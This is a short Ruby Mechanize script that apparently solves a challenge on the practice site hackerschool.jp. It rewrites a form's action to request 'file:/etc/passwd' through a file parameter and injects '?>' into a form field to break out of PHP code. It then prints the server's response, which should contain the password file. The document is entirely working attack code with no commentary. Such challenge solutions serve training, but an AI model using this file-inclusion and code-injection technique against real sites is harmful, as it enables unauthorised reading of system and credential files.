#!/usr/bin/ruby
require 'mechanize'
require 'cgi'
mech=Mechanize.new
uri=URI.parse('http://www.hackerschool.jp/hack/take43.php')
#str='PHPSESSID='
#Mechanize::Cookie.parse(uri, str){|c|mech.cookie_jar.add(uri, c)}
mech.get(uri)
form=mech.page.forms[4]
file='file:/etc/passwd'
form.action='/hack/take43.php?file='+file
form.input_id='?>'
form.pass='a'
form.submit
puts mech.page.body.split('http://pagead2.googlesyndication.com/pagead/show_ads.js')[1]